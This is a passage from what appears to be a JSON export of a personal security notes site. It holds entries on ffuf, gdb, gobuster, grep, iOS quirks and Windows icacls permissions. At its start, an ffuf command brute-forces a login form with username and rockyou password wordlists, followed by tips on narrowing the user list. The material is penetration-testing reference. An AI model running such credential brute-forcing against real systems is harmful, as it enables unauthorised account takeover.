style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/wordlists/wfuzz/others/names.txt:W1,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$HOME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/.local/share/red-team/wordlists/rockyou.txt:W2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -X&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$POST_VARS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOGIN_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -fc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 200&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here we assign W1 and W2 to take terms from the two supplied wordlists; &lt;code&gt;$POST_VARS&lt;/code&gt; then looks something like &lt;code&gt;username=W1&amp;#x26;password=W2&lt;/code&gt;. This example assumes that a successful login will return an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; status code &lt;em&gt;other&lt;/em&gt; than 200 (probably a 301 or 302);  &lt;code&gt;-s&lt;/code&gt; supresses all output except successful fuzzes (the inverse of &lt;code&gt;-fc&lt;/code&gt;).&lt;/p&gt;\n&lt;p&gt;Note that ffuf will try every possible combination of elements between the two wordlists, which means that the number of combinations tried grows geometrically. So you probably &lt;em&gt;don’t&lt;/em&gt; want to try the above example directly, but rather generate a shorter user list first via enumeration (see the previous section).&lt;/p&gt;"},"spells/gdb":{"slug":"spells/gdb","filePath":"spells/gdb.md","title":"gdb","links":[],"tags":["Application/gdb"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_GDB.txt.\n\n\n\nStartup\ngdb                   # Run; use file command to load $OBJECT\ngdb $OBJECT           # Debug $OBJECT\ngdb $OBJECT $COREDUMP # Analyze $COREDUMP\ngdb $OBJECT $PID      # Attach to running process $PID\nGeneral commands\nset args                     # Set program arguments\nshow args                    # Show program arguments\nrun                          # Run the program\nrun &lt; file                   # Run with input from file\nset follow-exec-mode new/sam # Set debugger response to exec\nset write                    # Set write into executables\nset write off                # Unset write int oexecutables \ncontinue                     # Continue running until break\nfinish                       # Exec until current frame ends\nsource FILE                  # Read commands from script file\nshell [cmd]                  # Run cmd in a shell\ndisplay /5i $eip             # Display $eip at execution end\nundisplay &lt;expr #&gt;           # Undisplay expression number\ninfo functions               # List all the functions\ninfo variables               # List all the variables\ninfo registers               # List most common registers\ninfo all-registers           # List all registers\ninfo display                 # List of displayed expressions\nbacktrace                    # Backtrace of all stack frames\nwhere                        # Same as backtrace\nset disassembly-flavor intel # Disassembly style to intel/att\ndefine hook-[cmd]            # Action before command\ndefine hooopost-[cmd]        # Action after command\ndefine hook-stop             # Action when execution stops\nBreakpoints\ninfo breakpoints              # List all breakpoints\nbreak [func]                  # Break function name\nbreak *[addr]                 # Break at address\ndelete [bnum]                 # Delete breakpoint bnum\nbreak if [cond]               # Break if condition\nignore [bnum] [count]         # Ignore breakpoint count times\ncondition [bnum] $eax == 0x22 # Add condition for breakpoint\ncondition [bnum]              # Del condition for breakpoint\nWatchpoints\ninfo watchpoints         # List all the watchpoint\nwatch variable==value    # Break when variable equals ...\nwatch $eax == 0x0000ffaa # Break when register equals ...\nrwatch *[addr]           # Break on read memory location\nawatch *[addr]           # Break on read/write memory location","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_GDB.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_GDB.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;startup&quot;&gt;Startup&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#startup&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gdb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;                   # Run; use file command to load $OBJECT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gdb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;           # Debug $OBJECT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gdb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $COREDUMP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; # Analyze $COREDUMP&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gdb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;      # Attach to running process $PID&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;general-commands&quot;&gt;General commands&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#general-commands&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set args                     # Set program arguments&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;show args                    # Show program arguments&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;run                          # Run the program&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;run &amp;#x3C; file                   # Run with input from file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set follow-exec-mode new/sam # Set debugger response to exec&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set write                    # Set write into executables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set write off                # Unset write int oexecutables &lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;continue                     # Continue running until break&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;finish                       # Exec until current frame ends&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;source FILE                  # Read commands from script file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;shell [cmd]                  # Run cmd in a shell&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;display /5i $eip             # Display $eip at execution end&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;undisplay &amp;#x3C;expr #&gt;           # Undisplay expression number&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info functions               # List all the functions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info variables               # List all the variables&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info registers               # List most common registers&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info all-registers           # List all registers&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info display                 # List of displayed expressions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;backtrace                    # Backtrace of all stack frames&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;where                        # Same as backtrace&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set disassembly-flavor intel # Disassembly style to intel/att&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;define hook-[cmd]            # Action before command&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;define hooopost-[cmd]        # Action after command&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;define hook-stop             # Action when execution stops&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;breakpoints&quot;&gt;Breakpoints&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#breakpoints&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info breakpoints              # List all breakpoints&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;break [func]                  # Break function name&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;break *[addr]                 # Break at address&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;delete [bnum]                 # Delete breakpoint bnum&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;break if [cond]               # Break if condition&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;ignore [bnum] [count]         # Ignore breakpoint count times&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;condition [bnum] $eax == 0x22 # Add condition for breakpoint&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;condition [bnum]              # Del condition for breakpoint&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;watchpoints&quot;&gt;Watchpoints&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#watchpoints&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;gdb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;info watchpoints         # List all the watchpoint&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;watch variable==value    # Break when variable equals ...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;watch $eax == 0x0000ffaa # Break when register equals ...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;rwatch *[addr]           # Break on read memory location&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;awatch *[addr]           # Break on read/write memory location&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/gobuster":{"slug":"spells/gobuster","filePath":"spells/gobuster.md","title":"gobuster","links":[],"tags":["Application/gobuster","AttackCycle/Reconnaissance"],"content":"Gobuster is pretty straight-forward. Use gobuster --help to get general help, and gobuster $CMD --help to get detailed help specific to a particular command.\nIncreasing threads (-t) in gobuster makes a big difference in performance. (Probably makes you noisier too…)","richContent":"&lt;p&gt;Gobuster is pretty straight-forward. Use &lt;code&gt;gobuster --help&lt;/code&gt; to get general help, and &lt;code&gt;gobuster $CMD --help&lt;/code&gt; to get detailed help specific to a particular command.&lt;/p&gt;\n&lt;p&gt;Increasing threads (&lt;code&gt;-t&lt;/code&gt;) in gobuster makes a &lt;em&gt;big&lt;/em&gt; difference in performance. (Probably makes you noisier too…)&lt;/p&gt;"},"spells/grep":{"slug":"spells/grep","filePath":"spells/grep.md","title":"grep","links":[],"tags":["Application/grep"],"content":"# Case-insensitive grep\n#\ngrep -i $STRING $FILE\n \n# Recursive grep of all files in a folder (and its subfolders)\n#\ngrep $STRING -r $DIRECTORY","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Case-insensitive grep&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Recursive grep of all files in a folder (and its subfolders)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DIRECTORY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/iOS-quirks":{"slug":"spells/iOS-quirks","filePath":"spells/iOS quirks.md","title":"iOS quirks","links":[],"tags":["Application/Shortcuts","Application/OneDrive","OS/iOS"],"content":"OneDrive\nOn iOS, OneDrive files cannot be accessed through the Files app if a passcode is enabled.\nOn iOS, explicitly downloading an image or video in OneDrive will automatically add it to your iCloud Photo Library. (It doesn’t appear that this happens to images and videos in a folder set for offline use, but I’m not 100% sure about this.)\nShortcuts\n“Add to variable” vs. “Set to variable”\nIn my experience, the “Add to variable” action is unreliable for appending text to strings; it seems to work to create a variable, but not actually for appends. However, “Set to variable” seems to be reliable, so a work-around is to set a whole bunch of variables and then use a “Text” action at the end of the workflow to assemble them as desired.\nGet Shortcuts to show up in the iOS share sheet after reinstallation\nFor whatever reason, shortcuts created in the iOS Shortcuts app won’t show up in apps’ share sheets if you’ve uninstalled Shortcuts and then reinstall it. To solve this, simply reboot the device and then open up the Shortcuts app (no need to run anything, just open it once).","richContent":"&lt;h2 id=&quot;onedrive&quot;&gt;OneDrive&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#onedrive&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;On iOS, OneDrive files cannot be accessed through the Files app if a passcode is enabled.&lt;/p&gt;\n&lt;p&gt;On iOS, &lt;em&gt;explicitly&lt;/em&gt; downloading an image or video in OneDrive will automatically add it to your iCloud Photo Library. (It doesn’t &lt;em&gt;appear&lt;/em&gt; that this happens to images and videos in a folder set for offline use, but I’m not 100% sure about this.)&lt;/p&gt;\n&lt;h2 id=&quot;shortcuts&quot;&gt;Shortcuts&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#shortcuts&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;add-to-variable-vs-set-to-variable&quot;&gt;“Add to variable” vs. “Set to variable”&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#add-to-variable-vs-set-to-variable&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;In my experience, the “Add to variable” action is unreliable for appending text to strings; it seems to work to &lt;em&gt;create&lt;/em&gt; a variable, but not actually for appends. However, “Set to variable” seems to be reliable, so a work-around is to set a whole bunch of variables and then use a “Text” action at the end of the workflow to assemble them as desired.&lt;/p&gt;\n&lt;h3 id=&quot;get-shortcuts-to-show-up-in-the-ios-share-sheet-after-reinstallation&quot;&gt;Get Shortcuts to show up in the iOS share sheet after reinstallation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#get-shortcuts-to-show-up-in-the-ios-share-sheet-after-reinstallation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;For whatever reason, shortcuts created in the iOS Shortcuts app won’t show up in apps’ share sheets if you’ve uninstalled Shortcuts and then reinstall it. To solve this, simply reboot the device and then open up the Shortcuts app (no need to run anything, just open it once).&lt;/p&gt;"},"spells/icacls":{"slug":"spells/icacls","filePath":"spells/icacls.md","title":"icacls","links":[],"tags":["Application/icacls","Application/PowerShell","OS/Windows/Permissions"],"content":"Use icacls or Get-Acl $PATH | Format-List in PowerShell to check permissions at the command line. The icacls tool can also be used to update Windows ACLs.\nBoth of these tools produce output that is somewhat different than that of the “Security” tab in the file or folder properties:\n\n(I) — permission inherited from the parent container\n(F) — full access (full control)\n(M) — modify right/access\n(OI) — object inherit\n(IO) — inherit only\n(CI) — container inherit\n(RX) — read and execute\n(AD) — append data (add subdirectories)\n(WD) — write data and add files\n\nNote that the Windows File Explorer only displays the first ACL for a particular user or group, but that Windows allows multiple ACLs to be applied! This means that the File Explorer does not always show you the actual permissions a user/group will have — you really do need to use icacls or Get-Acl.\nIn the case of multiple ACLs, or when a user is part of two groups with different groups, keep in mind that allow permissions only override inherited deny permissions. Explicitly set deny permissions cannot be overridden.","richContent":"&lt;p&gt;Use icacls or &lt;code&gt;Get-Acl $PATH | Format-List&lt;/code&gt; in PowerShell to check permissions at the command line. The icacls tool can also be used to update Windows ACLs.&lt;/p&gt;\n&lt;p&gt;Both of these tools produce output that is somewhat different than that of the “Security” tab in the file or folder properties:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;(I)&lt;/code&gt; — permission inherited from the parent container&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(F)&lt;/code&gt; — full access (full control)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(M)&lt;/code&gt; — modify right/access&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(OI)&lt;/code&gt; — object inherit&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(IO)&lt;/code&gt; — inherit only&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(CI)&lt;/code&gt; — container inherit&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(RX)&lt;/code&gt; — read and execute&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(AD)&lt;/code&gt; — append data (add 